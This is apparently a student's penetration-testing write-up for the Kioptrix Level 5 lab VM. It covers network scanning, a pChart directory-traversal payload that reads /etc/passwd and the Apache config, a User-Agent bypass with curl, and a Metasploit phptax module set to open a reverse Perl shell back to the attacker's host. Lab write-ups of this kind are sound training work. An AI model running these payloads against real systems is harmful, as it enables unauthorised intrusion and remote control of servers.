# Kioptrix Level 5 Exploitation
# Objective
The objective of this lab was to perform reconnaissance, identify vulnerabilities, and exploit the Kioptrix Level 5 machine to gain a command shell using Linux penetration testing techniques.

# Tools Used
1. Nmap
2. Curl
3. Firefox Browser
4. Metasploit Framework
5. Kali Linux

# Reconnaissance
The first step involved identifying the attacker’s IP address using `ifconfig.`
Next, a netdiscover scan was performed to identify live hosts within the subnet and locate the target machine: `sudo netdiscover -i eth1 -r 192.168.56.106.`
The target machine was identified at: `192.168.56.106`
A service scan was then performed: `nmap -sV -p- 168.56.106`
This revealed that ports `80` and `8080` were open.

# Web Enumeration
Accessing the target via a browser confirmed that a web server was running:
on `Firefox Google: http://192.168.56.106`
Further enumeration using directory brute forcing revealed the presence of the `pChart 2.1.3` application.
A directory traversal vulnerability was identified using the following payload: /examples/index.php?Action=View&Script=../../etc/passwd
This allowed access to sensitive system files and confirmed that the target was running `FreeBSD 9.0.`

# Further Information Gathering

Attempts were made to retrieve Apache configuration files using directory traversal: `../../usr/local/etc/apache22/httpd.conf`
Different Apache versions were tested `(apache, apache2, apache21)`, with `apache22` yielding results.

# Port 8080 Access Restriction

Port 8080 was found to be restricted and required a specific User-Agent header for access.
Using curl: `curl -A "Mozilla/4.0 Mozilla4_browser" http://192.168.56.106:8080 -v`
This successfully bypassed the restriction and revealed the `Phptax` application.

# Vulnerability Identification
Research on the Phptax application revealed known vulnerabilities documented in exploit databases. This led to the identification of a remote command execution vulnerability exploitable via Metasploit.

# Exploitation Using Metasploit

The Metasploit Framework was launched: `msfconsole.`
The Phptax exploit module was selected: `use exploit/multi/http/phptax.`
The required options were configured:
1. `set RHOSTS 192.168.56.106.`
2. `set LHOST 192.168.56.105.`
3. `set LPORT 4445.`
4. `set TARGETURI /.`
5. `set UserAgent Mozilla/4.0.`
6. `set PAYLOAD cmd/unix/reverse_perl.`
7. `exploit`

The exploit was executed:

# Result
A reverse shell was successfully established, granting command-line access to the target Phptax server.
